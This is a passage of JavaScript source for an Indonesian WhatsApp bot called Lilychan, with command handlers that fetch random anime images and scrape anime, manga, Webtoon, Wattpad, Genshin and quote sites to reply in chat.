        if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
        if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
        if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
        if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
        if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
        if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
        if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
        if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
        if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
        if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
        if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
        if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
        if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
        if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasen.json')
        if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
        if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
        if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
        if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
        if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
        if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
        if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
        if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
        if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
        if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
        if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let tanakasense = heyy[Math.floor(Math.random() * heyy.length)];

lilychan.sendMessage(m.chat, {
    image: { url: tanakasense },
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363285176234746@newsletter',
            serverMessageId: 20,
            newsletterName: '❃ Lilychanj - Assistant'
        },
        externalAdReply: {
            title: "Lilychanj - Wabot",
            body: "",
            thumbnailUrl: "https://files.catbox.moe/w4hysj.jpg",
            sourceUrl: null,
            mediaType: 1
        }
    }
},{quoted:ftroli});
}
break
case 'storyanime':
case 'swanime': {
    async function animeVideo2() {
        const url = "https://mobstatus.com/anime-whatsapp-status-video/"; // Ganti dengan URL yang sesuai
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);

        const videos = [];
        const title = $("strong").text();

        $("a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy").each((index, element) => {
            const href = $(element).attr("href");
            videos.push({
                title,
                source: href,
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    m.reply(mess.wait);
    let data = await animeVideo2();
    await lilychan.sendFile(m.chat, data.source, null, data.title, m);
}
break;

case 'swanime2':
case 'storyanime2': {
    async function animeVideo() {
        const url = "https://shortstatusvideos.com/anime-video-status-download/"; // Ganti dengan URL yang sesuai
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);

        const videos = [];

        $("a.mks_button.mks_button_small.squared").each((index, element) => {
            const href = $(element).attr("href");
            const title = $(element).closest("p").prevAll("p").find("strong").text();
            videos.push({
                title,
                source: href,
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    m.reply(mess.wait);
    let data = await animeVideo();
    await lilychan.sendFile(m.chat, data.source, null, data.title, m);
}
break;
case 'kataanime':{
    	try {
		let res = await await fetch("https://katanime.vercel.app/api/getrandom");
		if (!res.ok) throw await res.text();
		let json = await res.json();
		if (!json.result) throw json;
		let data = "";
		for (let i = 0; i < json.result.length; i++) {
			let { id, english, indo, character, anime } = json.result[i];
			data += `_*•.* "${indo}"_\n${character} (${anime})\n\n`;
		}
		m.reply(data);
	} catch (e) {
		console.log(e);
		m.reply("Maaf, gagal mengambil data");
	}
};
break
case 'charactersearch': {
    async function MalSearchCharacter(character) {
        return new Promise(async (resolve, reject) => {
            try {
                let results = [];
                const { data } = await axios.get('https://myanimelist.net/character.php?q=' + character);
                var $ = cheerio.load(data);
                $('table').each((i, u) => {
                    for (let i = 0; i < 10; i++) {
                        let b = $(u).find('tr > td.borderClass:nth-child(2)')[i];
                        let c = $(u).find('tr > td.borderClass:nth-child(1)')[i];
                        let d = $(u).find('tr > td.borderClass:nth-child(3)')[i];
                        let name = $(b).find('a').text().trim();
                        let alias_name = $(b).find('small').text().trim();
                        let url = $(b).find('a').attr('href');
                        let thumbnail = $(c).find('a > img').attr('data-src');
                        let anime = $(d).find('small > a:nth-child(1)').text().trim();
                        let manga = $(d).find('small > a:nth-child(2)').text().trim();
                        if (typeof url === 'undefined') return;
                        results.push({
                            name: name ? name : 'No Name',
                            alias_name: alias_name ? alias_name : 'No Alias',
                            url: url ? url : 'No Url',
                            thumbnail: thumbnail ? thumbnail : 'https://i.ibb.co/G7CrCwN/404.png',
                            anime: anime ? anime : 'No In Anime',
                            manga: manga ? manga : 'No In Manga'
                        });
                    }
                });
                if (results.every(x => x === undefined)) return { mess: 'No result found' };
                resolve(results);
            } catch (error) {
                console.error(error.toString());
            }
        });
    }

    if (!text) return m.reply('Penggunaan: .charactersearch Roronoa Zoro');
    m.reply('wait a minute...');
    let result = await MalSearchCharacter(text);
    let message = 'Hasil pencarian:\n\n';
    message += `Name : ${result[0].name}\nNama Panggilan : ${result[0].alias_name}\nDari Anime : ${result[0].anime}\nLink: ${result[0].url}\n\n`;
    await lilychan.sendFile(m.chat, result[0].thumbnail, null, message, m);
}
break;

case 'topanime':
case 'animetop': {
    async function MalTopAiring() {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://myanimelist.net/topanime.php?type=airing');
                let results = [];
                var $ = cheerio.load(data);
                $('div.pb12 > table.top-ranking-table').each((i, u) => {
                    for (let i = 0; i < 10; i++) {
                        let b = $(u).find('tr.ranking-list > td.ac');
                        let c = $(u).find('tr.ranking-list > td.title')[i];
                        let d = $(u).find('tr.ranking-list > td.score')[i];
                        results.push({
                            rank: i + 1,
                            thumbnail: $(c).find('a.hoverinfo_trigger > img').attr('data-src'),
                            title: $(c).find('div.detail > div.clearfix > h3 > a').text().trim(),
                            score: $(d).find('span').text().trim(),
                            link: $(c).find('a.hoverinfo_trigger').attr('href')
                        });
                    }
                });
                if (results.every(x => x === undefined)) return { mess: 'No result found' };
                resolve(results);
            } catch (error) {
                console.error(error.toString());
            }
        });
    }

    m.reply('wait a minute...');
    let results = await MalTopAiring();
    if (results.length > 0) {
        let message = '*TOP ANIME BULAN INI*\n\n';
        results.forEach((result, index) => {
            message += `${result.rank}. *${result.title}*\n- Score: ${result.score}\n- Link: ${result.link}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].thumbnail, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;

case 'topdoujin': {
    async function topDoujin(type = 'doujin') {
        return new Promise((resolve, reject) => {
            axios.get('https://myanimelist.net/topmanga.php?type=' + type)
                .then(({ data }) => {
                    let $ = cheerio.load(data);
                    let hasil = [];
                    $('tr.ranking-list').each((a, b) => {
                        hasil.push({
                            rank: $(b).find('td.rank.ac > span').text(),
                            title: $(b).find('td.title.al.va-t.clearfix.word-break > div > h3').text(),
                            info: $(b).find('td.title.al.va-t.clearfix.word-break > div > div.information.di-ib.mt4').text().trim(),
                            rating: $(b).find('td.score.ac.fs14 > div').text(),
                            detail: $(b).find('td.title.al.va-t.clearfix.word-break > div > h3 > a').attr('href'),
                            image: $(b).find('td.title.al.va-t.clearfix.word-break > a > img').attr('data-src') || $(b).find('td.title.al.va-t.clearfix.word-break > a > img').attr('src')
                        });
                    });
                    resolve(hasil);
                });
        });
    }

    m.reply('wait a minute...');
    let results = await topDoujin();
    
    if (results.length > 0) {
        let message = '*TOP DOUJIN BULAN INI*\n\n';
        results.forEach((result) => {
            message += `${result.rank}. *${result.title}*\n- Score: ${result.rating}\n- Info: ${result.info}\n- Link: ${result.detail}\n\n`;
        });
        await m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break

case 'mangasearch': {
    async function MalSearchManga(manga) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://myanimelist.net/manga.php?q=' + manga + '&cat=manga');
                let results = [];
                var $ = cheerio.load(data);
                
                $('div.js-categories-seasonal > table').each((i, u) => {
                    for (let i = 1; i < 10; i++) {
                        let b = $(u).find('td.borderClass:nth-child(2)')[i];
                        let c = $(u).find('td.borderClass:nth-child(3)')[i];
                        let d = $(u).find('td.borderClass:nth-child(4)')[i];
                        let e = $(u).find('td.borderClass:nth-child(5)')[i];
                        let f = $(u).find('td.borderClass:nth-child(1)')[i];
                        let link = $(b).find('a:nth-child(2)').attr('href');
                        
                        if (typeof link === 'undefined') return;
                        
                        results.push({
                            title: $(b).find('a.hoverinfo_trigger > strong').text(),
                            type: $(c).text().trim(),
                            vol: $(d).text().trim(),
                            score: $(e).text().trim(),
                            link: link,
                            thumbnail: $(f).find('a.hoverinfo_trigger > img').attr('data-src')
                        });
                    }
                });

                if (results.every(x => x === undefined)) return { mess: 'No result found' };
                resolve(results);
            } catch (error) {
                console.error(error.toString());
            }
        });
    }

    if (!text) return m.reply(`Penggunaan: ${prefix + command} one piece`);
    m.reply('wait a minute...');
    let results = await MalSearchManga(text);
    
    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `${index + 1}. *${result.title}*\n- Type: ${result.type}\n- Vol: ${result.vol}\n- Score: ${result.score}\n- Link: ${result.link}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].thumbnail, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break
case 'mangatoon': {
    async function smangatoon(search) {
        if (!search) return "No Querry Input! Bakaa >\/\/<";
        
        try {
            const res = await axios.get(`https://mangatoon.mobi/en/search?word=${search}`, {
                method: "GET",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36"
                }
            });

            const hasil = [];
            const $ = cheerio.load(res.data);
            
            $('div.recommend-item').each((a, b) => {
                let comic_name = $(b).find('div.recommend-comics-title > span').text();
                let comic_type = $(b).find('div.comics-type > span').text().slice(1).split(/ /g).join("");
                let comic_url = $(b).find('a').attr('href');
                let comic_thumb = $(b).find('img').attr('src');

                const result = {
                    status: res.status,
                    creator: "@TanakaSense",
                    comic_name,
                    comic_type,
                    comic_url: 'https://mangatoon.mobi' + comic_url,
                    comic_thumb
                };

                hasil.push(result);
            });

            let filt = hasil.filter(v => v.comic_name !== undefined && v.comic_type !== undefined);
            return filt;

        } catch (error) {
            return "=> Error => " + error;
        }
    }

    if (!text) return m.reply(`Penggunaan: ${prefix + command} one piece`);
    
    m.reply('wait a minute...');
    let results = await smangatoon(text);
    
    if (results.length > 0) {
        let TanakaSz = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result, index) => {
            TanakaSz += `${index + 1}. *${result.comic_name}*\n- Type: ${result.comic_type}\n- Link Baca: ${result.comic_url}\n\n`;
        });
        m.reply(TanakaSz);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break
case 'kiryuu':
case 'kiryuusearch': {
    let urlKiryuu = "https://kiryuu.id/";

    async function scrapKiryuuSearch(t) {
        return new Promise((resolve, reject) => {
            axios.get(`${urlKiryuu}?s=${t}`)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    let urls = [];
                    let thumbs = [];
                    let names = [];
                    let types = [];
                    let chapters = [];
                    let ratings = [];

                    // Mengambil data dari halaman
                    $("div.listupd > div > div > a").each((_, element) => {
                        urls.push($(element).attr("href"));
                        names.push($(element).attr("title"));
                    });

                    $("div.listupd > div > div > a > div > img").each((_, element) => {
                        thumbs.push($(element).attr("src"));
                    });

                    $("div.listupd > div > div > a > div > span:nth-child(2)").each((_, element) => {
                        types.push($(element).attr("class"));
                    });

                    $("div.listupd > div > div > a > div:nth-child(2) > div > div:nth-child(1)").each((_, element) => {
                        chapters.push($(element).text());
                    });

                    $("div.listupd > div > div > a > div:nth-child(2) > div > div:nth-child(2) > div > div:nth-child(2)").each((_, element) => {
                        ratings.push($(element).text());
                    });

                    // Menggabungkan data ke dalam objek
                    let results = [];
                    for (let i = 0; i < urls.length; i++) {
                        results.push({
                            name: names[i],
                            thumb: thumbs[i],
                            type: types[i],
                            chapter: chapters[i],
                            rating: ratings[i],
                            url: urls[i],
                        });
                    }

                    // Filter hasil
                    let filteredResults = results.filter(result => 
                        result.name && result.thumb && result.type && result.chapter && result.rating && result.url
                    );

                    resolve(filteredResults);
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply(`Penggunaan: ${prefix + command} one piece`);
    
    m.reply('wait a minute...');
    let results = await scrapKiryuuSearch(text);
    
    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result, index) => {
            message += `${index + 1}. *${result.name}*\n- Type: ${result.type}\n- Chapter: ${result.chapter}\n- Rating: ${result.rating}\n- Link Baca: ${result.url}\n\n`;
        });
        lilychan.sendMessage(m.chat, { image: { url: results[0].thumb }, caption: message }, { quoted: m });
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break

case 'gensingg': {
    async function genshin() {
        try {
            const { data } = await axios.get('https://genshin.gg');
            const $ = cheerio.load(data);
            const characters = [];

            $('.character-list a.character-portrait').each((_, element) => {
                const name = $(element).find('h2.character-name').text();
                const imgSrc = $(element).find('img.character-icon').attr('src');
                const elementType = $(element).find('img.character-type').attr('alt');
                const link = $(element).attr('href');

                characters.push({
                    name,
                    imgSrc,
                    elementType,
                    link: `https://genshin.gg${link}`
                });
            });
            return characters;
        } catch (error) {
            console.error('Error fetching data:', error);
        }
    }

    m.reply(mess.wait);
    let data = await genshin();
    let src = pickRandom(data);
    let caption = `Link: ${src.link}\n`;

    const lilyMauNgrwek = await new canvafy.WelcomeLeave()
        .setAvatar(src.imgSrc)
        .setBackground("image", "https://j.top4top.io/p_320785bw21.jpg")
        .setTitle(src.name)
        .setDescription(`Element: ${src.elementType}`)
        .setBorder("#2a2e35")
        .setAvatarBorder("#2a2e35")
        .setOverlayOpacity(0.5)
        .build();

    lilychan.sendMessage(m.chat, { image: lilyMauNgrwek, caption: caption }, { quoted: m });
}
break
case 'wattpad': {
    async function WattPad(judul) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://www.wattpad.com/search/' + judul, {
                    headers: {
                        cookie: 'wp_id=d92aecaa-7822-4f56-b189-f8c4cc32825c; sn__time=j%3Anull; fs__exp=1; adMetrics=0; _pbkvid05_=0; _pbeb_=0; _nrta50_=0; lang=20; locale=id_ID; ff=1; dpr=1; tz=-8; te_session_id=1681636962513; _ga_FNDTZ0MZDQ=GS1.1.1681636962.1.1.1681637905.0.0.0; _ga=GA1.1.1642362362.1681636963; signupFrom=search; g_state={"i_p":1681644176441,"i_l":1}; RT=r=https%3A%2F%2Fwww.wattpad.com%2Fsearch%2Fanime&ul=1681637915624',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0'
                    }
                });

                const $ = cheerio.load(data);
                const limk = 'https://www.wattpad.com';
                const _data = [];

                $('.story-card-container > ul.list-group.new-list-group > li.list-group-item').each(function (i, u) {
                    let link = limk + $(u).find('a').attr('href');
                    let judul = $(u).find('a > div > div.story-info > div.title').text().trim();
                    let img = $(u).find('a > div > div.cover > img').attr('src');
                    let desc = $(u).find('a > div > div.story-info > .description').text().replace(/\s+/g, ' ');
                    let _doto = [];

                    $(u).find('a > div > div.story-info > .new-story-stats > .stats-item').each((_, i) => {
                        _doto.push($(i).find('.icon-container > .tool-tip > .sr-only').text());
                    });

                    _data.push({
                        title: judul,
                        thumb: img,
                        desc: desc,
                        reads: _doto[0],
                        vote: _doto[1],
                        chapter: _doto[2],
                        link: link,
                    });
                });

                resolve(_data);
            } catch (err) {
                console.error(err);
                reject(err);
            }
        });
    }

    if (!text) return m.reply('Masukan judul yang ingin dicari!!\nContoh: .wattpad perjodohan');
    
    let results = await WattPad(text);
    
    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result, index) => {
            message += `Title: ${result.title}\nChapter: ${result.chapter}\nVote: ${result.vote}\nTotal Pembaca: ${result.reads}\nDesc: ${result.desc}\nLink Baca: ${result.link}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].thumb, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break

case 'webtoon': {
    async function webtoons(query) {
        return new Promise((resolve, reject) => {
            axios.get(`https://www.webtoons.com/id/search?keyword=${query}`)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    const hasil = [];

                    $('#content > div.card_wrap.search._searchResult > ul > li').each(function (a, b) {
                        const result = {
                            status: 200,
                            judul: $(b).find('> a > div > p.subj').text(),
                            like: $(b).find('> a > div > p.grade_area > em').text(),
                            creator: $(b).find('> a > div > p.author').text(),
                            genre: $(b).find('> a > span').text(),
                            thumbnail: $(b).find('> a > img').attr('src'),
                            url: $(b).find('> a').attr('href')
                        };
                        hasil .push(result);
                    });

                    resolve(hasil);
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply('Masukan judul yang ingin dicari!!\nContoh: .webtoon lookism');
    
    let results = await webtoons(text);
    
    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result, index) => {
            message += `Title: ${result.judul}\nLike: ${result.like}\nCreator: ${result.creator}\nGenre: ${result.genre}\nLink Baca: ${result.url}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break
case 'kusonime': {
    async function scrapKusonime(t) {
        return new Promise((resolve, reject) => {
            const query = t;
            axios.get(`https://kusonime.com/?s=${query}&post_type=post`)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    let links = [];
                    
                    // Mengambil link dari hasil pencarian
                    $("div.content > h2 > a").get().map((element) => {
                        links.push($(element).attr("href"));
                    });

                    // Mengambil detail dari link pertama
                    axios.get(links[0]).then(({ data }) => {
                        const $ = cheerio.load(data);
                        const title = $('div[class="post-thumb"] > h1').text();
                        const thumb = $('div[class="post-thumb"] > img').attr("src");
                        const title_jp = $("div.info > p:nth-child(1)").text().split(":")[1].trim();
                        const genre = $("div.info > p:nth-child(2)").text().split(":")[1].trim();
                        const season = $("div.info > p:nth-child(3)").text().split(":")[1].trim();
                        const producers = $("div.info > p:nth-child(4)").text().split(":")[1].trim();
                        const type = $("div.info > p:nth-child(5)").text().split(":")[1].trim();
                        const status_anime = $("div.info > p:nth-child(6)").text().split(":")[1].trim();
                        const total_episode = $("div.info > p:nth-child(7)").text().split(":")[1].trim();
                        const score = $("div.info > p:nth-child(8)").text().split(":")[1].trim();
                        const duration = $("div.info > p:nth-child(9)").text().split(":")[1].trim();
                        const released = $("div.info > p:nth-child(10)").text().split(":")[1].trim();
                        const view = $("div.kategoz > span").text();
                        const description = $("div.lexot > p:nth-child(3)").text();

                        let downloadLinks = [];
                        $('div[class="venser"]')
                            .find('div[class="lexot"]')
                            .children('div[class="dlbod"]')
                            .children('div[class="smokeddl"]')
                            .first()
                            .children('div[class="smokeurl"]')
                            .each((_, item) => {
                                const resolution = $(item).children("strong").text();
                                const linksList = [];
                                $(item).children("a").each((_, linkItem) => {
                                    const url = $(linkItem).attr("href");
                                    const name = $(linkItem).text();
                                    linksList.push({ url, name });
                                });
                                downloadLinks.push({ reso: resolution, list: linksList });
                            });

                        resolve({
                            status: true,
                            title,
                            title_jp,
                            view,
                            thumb,
                            genre,
                            season,
                            producers,
                            type,
                            status_anime,
                            total_episode,
                            score,
                            duration,
                            released,
                            description,
                            result: downloadLinks,
                        });
                    });
                })
                .catch(reject);
        });
    }

    try {
        if (!text) return m.reply('Masukan anime yang ingin dicari!!\nContoh: .kusonime naruto');
        m.reply(mess.wait);
        let data = await scrapKusonime(text);
        let caption = `KUSONIME 🦊
Title: ${data.title}
Views: ${data.view}
Type: ${data.type}
Season: ${data.season}
Status: ${data.status_anime}
Genre: ${data.genre}
Eps: ${data.total_episode}
Produser: ${data.producers}
Durasi: ${data.duration}
Score: ${data.score}
Rilis: ${data.released}
Sinopsis: ${data.description}
`;
        lilychan.sendMessage(m.chat, { image: { url: data.thumb }, caption: caption }, { quoted: m });
    } catch (e) {
        m.reply("Pencarian gagal.");
    }
}
break
case  'animesearch':{
const axios = require('axios');
const cheerio = require('cheerio');
async function anu(search) {
 const url = 'https://otakudesu.cloud/?s=' + search + '&post_type=anime';

 try {
   let response = await axios.get(url);
   const $ = cheerio.load(response.data);

   const results = [];

   $('ul.chivsrc li').each((index, element) => {
     const title = $(element).find('h2 a').text();
     const link = $(element).find('h2 a').attr('href');
     const image = $(element).find('img').attr('src');
     const genres = [];

     $(element).find('.set a').each((i, el) => {
       genres.push($(el).text());
     });

     const status = $(element).find('.set:contains("Status")').text().replace('Status : ', '');
     const rating = $(element).find('.set:contains("Rating")').text().replace('Rating : ', '');

     results.push({ title, link, image, genres, status, rating });
   });

   return results;
 } catch (error) {
   console.error("Error fetching data:", error);
 }
}

async function ah(search) {
  let ngent = '';
  try {
    let response = await anu(search);
    let genre = [];
    response[0].genres.forEach((element, index) => {
      genre.push(`(${element})`);
    });
    ngent = `*👀 ANIME SEARCH*

\`nama:\` ${response[0].title}
\`link:\` ${response[0].link}
\`image:\` ${response[0].image}
\`genres:\` ${genre.join(', ')}
\`status:\` ${response[0].status}
\`rating:\` ${response[0].rating}`;
  } catch (error) {
    console.error(error);
  }
  return ngent;
}

if (!text) return m.reply('Penggunaan: .animesearch shinigami')
ah(text).then(response => {
m.reply(response)
})
}
break
case 'neko': {
    lilychan.sendMessage(m.chat, {
        react: {
            text: '🕒',
            key: m.key,
        }
    });

    let res = await fetch('https://api.waifu.pics/sfw/neko');
    let json = await res.json();

    lilychan.sendMessage(m.chat, {
        image: { url: json.url },
        caption: 'Done Desuu~'
    }, { quoted: m });
}
break

case 'gura':
case 'gurastick': {
    var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura');
    var wifegerak = ano.split('\n');
    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)];
    
    encmedia = await lilychan.sendImageAsSticker(m.chat, wifegerakx, m, {
        packname: global.packname,
        author: global.author,
    });
}
break
case 'animecharacter': {
    if (!text) {
        m.reply('Contoh: animecharacter naruto');
        return;
    }

    m.reply('_Sabar tuan, sedang mencari karakter anime..._');

    async function getCharacterInfo(characterName) {
        const query = `
        query ($search: String) {
            Character(search: $search) {
                name {
                    full
                }
                description
                media {
                    nodes {
                        title {
                            romaji
                        }
                    }
                }
            }
        }
        `;
        
        const variables = { search: characterName };

        const response = await fetch('https://graphql.anilist.co', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify({ query: query, variables: variables })
        });

        if (!response.ok) {
            throw new Error('Gagal mengambil data karakter');
        }

        const data = await response.json();
        return data.data.Character;
    }

    try {
        const query = text.trim();
        const characterInfo = await getCharacterInfo(query);

        if (!characterInfo) {
            m.reply('Karakter Gda.');
            return;
        }

        // Format hasil pencarian karakter
        const name = characterInfo.name.full;
        const description = characterInfo.description || 'Deskripsi tidak Ada';
        const mediaTitles = characterInfo.media.nodes.map(node => node.title.romaji).join(', ');

        const formattedDescription = description
            .replace(/\n/g, '\n\n') // jgb ubah
            .replace(/__([^__]+)__/g, '*$1*') // jgn ubah 
            .replace(/~\!?\[([^\]]+)]\(([^)]+)\)~?/g, '*$1* ($2)') // jgn ubah ini
            .replace(/^\s+/gm, '');

        const result = `*Nama Karakter:* ${name}\n\n*Deskripsi:* ${formattedDescription}\n\n*Media Terkait:* ${mediaTitles}`;

        m.reply(result);
    } catch (error) {
        m.reply(`Terjadi kesalahan: ${error.message}`);
    }
}
break
case 'matauang': {
    const axios = require('axios');

    async function getCurrency(country) {
        try {
            const url = `https://restcountries.com/v3.1/name/${encodeURIComponent(country)}?fullText=true`;
            const { data } = await axios.get(url);

            if (data && data.length > 0) {
                const countryData = data[0];
                const countryName = countryData.name.common;
                const currencies = countryData.currencies;
                const currencyNames = Object.values(currencies).map(curr => curr.name).join(', ');

                return `> Mata uang di ${countryName}\n\n> adalah ${currencyNames}`;
            } else {
                return "Maaf, data negara tidak ditemukan.";
            }
        } catch (error) {
            console.error('Error:', error);
            return "Terjadi Apa Ya Error keknya.";
        }
    }

    const country = m.text.split(' ').slice(1).join(' ');
    if (!country) {
        m.reply("contoh : matauang indonesia");
    } else {
        getCurrency(country).then(response => {
            m.reply(response);
        }).catch(error => {
            m.reply("err.");
        });
    }
}
break
case 'charagenshin': {
    if (!text) return m.reply(`Masukan Nama Character!\n\nContoh :\n${prefix + command} Hu Tao`)
    let { result, matchtype } = await (await fetch(`https://genshin-db-api.vercel.app/api/characters?query=${text}&matchCategories=true&dumpResult=true&queryLanguages=English&resultLanguage=Indonesian`)).json()
    if (matchtype == 'none') return m.reply(`Character "${text}" Tidak Ditemukan...`)
    let txt = `
❃ Name: ${result.fullname}
❃ Title: ${result.title}

❃ Desc: ${result.description}

❃ Element: ${result.element}
❃ Weapon Type: ${result.weapontype}
❃ Substat: ${result.substat}
❃ Gender: ${result.gender}
❃ Affiliation: ${result.affiliation}
❃ Birthday: ${result.birthday}
❃ Constellation: ${result.constellation}

❃ Cv:
• English ~ ${result.cv.english}
• Chinese ~ ${result.cv.chinese}
• Japanese ~ ${result.cv.japanese}
• Korean ~ ${result.cv.korean}
`.trim()
    lilychan.sendFile(m.chat, result.images.cover1, null, txt, m)
}
break
 //<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < QUOTES FITUR >

*/
//<================================================>//     
/*
    const Tanaka = pickRandom([
	  "https://pomf2.lain.la/f/x95cfd3d.mp4",
	  "https://pomf2.lain.la/f/lbhgv470.mp4",
	  "https://pomf2.lain.la/f/9ekux63n.mp4",
	  "https://pomf2.lain.la/f/zhpfol5t.mp4",
	  "https://pomf2.lain.la/f/k3d2gfkp.mp4",
	  "https://pomf2.lain.la/f/g72yqzz.mp4",
	  "https://pomf2.lain.la/f/bjnnhylm.mp4",
	  "https://pomf2.lain.la/f/3wborqx8.mp4",
	])
*/
 
case 'quotesanime':
case 'animequotes': {
    async function quotesAnime() {
        try {
            const page = Math.floor(Math.random() * 184);
            const { data } = await axios.get('https://otakotaku.com/quote/feed/' + page);
            const $ = cheerio.load(data);
            const hasil = [];
            
            $('div.kotodama-list').each((l, h) => {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                });
            });
            return hasil;
        } catch (error) {
            throw error;
        }
    }

    let data = await quotesAnime();
    let lily = pickRandom(data);
    const tweet = await new canvafy.Tweet()
        .setTheme("dim")
        .setUser ({ displayName: `${lily.karakter}`, username: `${lily.anime}` })
        .setVerified(true)
        .setComment(`${lily.quotes}`)
        .setAvatar(`${lily.gambar}`)
        .build();
    
    let tanaka = tweet;
    lilychan.sendMessage(m.chat, { image: tanaka, caption: '' }, { quoted: m });
}
break

case 'quotes': {
    async function quotes(input) {
        return new Promise((resolve, reject) => {
            fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
                .then(res => res.text())
                .then(res => {
                    const $ = cheerio.load(res);
                    let data = [];
                    
                    $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
                        let x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim();
                        let y = $(this).find('span[class="auteur-beschrijving"]').text().trim();
                        let z = $(element).find('q[class="fbquote"]').text().trim();
                        data.push({ author: x, bio: y, quote: z });
                    });
                    
